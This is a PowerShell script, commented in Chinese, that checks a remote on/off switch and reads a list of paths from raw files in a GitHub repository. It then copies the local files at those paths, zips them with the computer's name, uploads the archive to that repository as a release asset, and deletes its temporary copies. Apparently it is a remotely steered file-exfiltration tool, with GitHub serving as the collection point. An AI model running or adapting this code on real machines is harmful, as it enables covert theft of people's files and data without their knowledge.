# === 配置部分 ===
$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
if ([string]::IsNullOrEmpty($token)) {
    Write-Host "❌ GH_TOKEN 环境变量未设置，脚本终止。"
    return
}

$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

# === 工具函数 ===

# 判断文件是否被锁定
function Test-FileLock {
    param([string]$filePath)
    try {
        $stream = [System.IO.File]::Open($filePath, 'Open', 'ReadWrite', 'None')
        $stream.Close()
        return $false
    } catch {
        return $true
    }
}

# 拷贝非锁定文件到临时目录
function Copy-UnlockedFiles {
    param([string[]]$paths, [string]$tempDir)

    foreach ($path in $paths) {
        if (-not (Test-Path $path)) {
            Write-Host "⚠️ 路径不存在，跳过：$path"
            continue
        }

        $item = Get-Item $path
        if ($item.PSIsContainer) {
            Get-ChildItem $path -Recurse -File | ForEach-Object {
                if (-not (Test-FileLock $_.FullName)) {
                    $rel = $_.FullName.Substring($path.Length).TrimStart('\')
                    $target = Join-Path $tempDir ($item.Name + "\" + $rel)
                    $targetDir = Split-Path $target
                    if (-not (Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }
                    Copy-Item $_.FullName $target -Force
                } else {
                    Write-Host "🔒 文件被占用，跳过：$($_.FullName)"
                }
            }
        } else {
            if (-not (Test-FileLock $item.FullName)) {
                $target = Join-Path $tempDir $item.Name
                Copy-Item $item.FullName $target -Force
            } else {
                Write-Host "🔒 文件被占用，跳过：$($item.FullName)"
            }
        }
    }
}

# 创建 GitHub Release 并上传文件
function Upload-Zip {
    param([string]$zipPath, [string]$tagName)

    $uploadUrl = "https://api.github.com/repos/$repo/releases"
    $headers = @{
        Authorization = "token $token"
        "User-Agent"  = "upload-script"
        Accept        = "application/vnd.github+json"
    }

    try {
        $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
            tag_name   = $tagName
            name       = $tagName
            draft      = $false
            prerelease = $false
        } | ConvertTo-Json -Depth 3)
        Write-Host "✅ 创建 Release 成功，ID：$($release.id)"
    } catch {
        Write-Host "❌ 创建 Release 失败：" $_
        return
    }

    $assetName = [System.IO.Path]::GetFileName($zipPath)
    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$assetName"

    try {
        Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
            Authorization = "token $token"
            "Content-Type" = "application/zip"
            "User-Agent"   = "upload-script"
        } -InFile $zipPath
        Write-Host "✅ 上传 ZIP 文件成功：$assetName"
    } catch {
        Write-Host "❌ 上传 ZIP 文件失败：" $_
    }
}

# === 主流程 ===

# 检查上传开关
try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Write-Host "🛑 上传开关未启用（内容不是 'on'），脚本退出。"
        return
    }
} catch {
    Write-Host "❌ 无法读取上传开关：" $_
    return
}

# 读取路径列表
try {
    $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
    Write-Host "`n📦 上传路径列表："
    $uploadPaths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Host "❌ 无法读取路径配置：" $_
    return
}

# 创建临时目录并复制非锁定文件
$tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

Copy-UnlockedFiles -paths $uploadPaths -tempDir $tempDir

# 压缩为单个 ZIP
Add-Type -AssemblyName System.IO.Compression.FileSystem
$computerName = $env:COMPUTERNAME
$tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$zipPath = "$env:TEMP\$tag.zip"
[System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)

# 清理临时目录
Remove-Item $tempDir -Recurse -Force

# 上传压缩包
Upload-Zip -zipPath $zipPath -tagName $tag

# 删除压缩包
Remove-Item $zipPath -Force
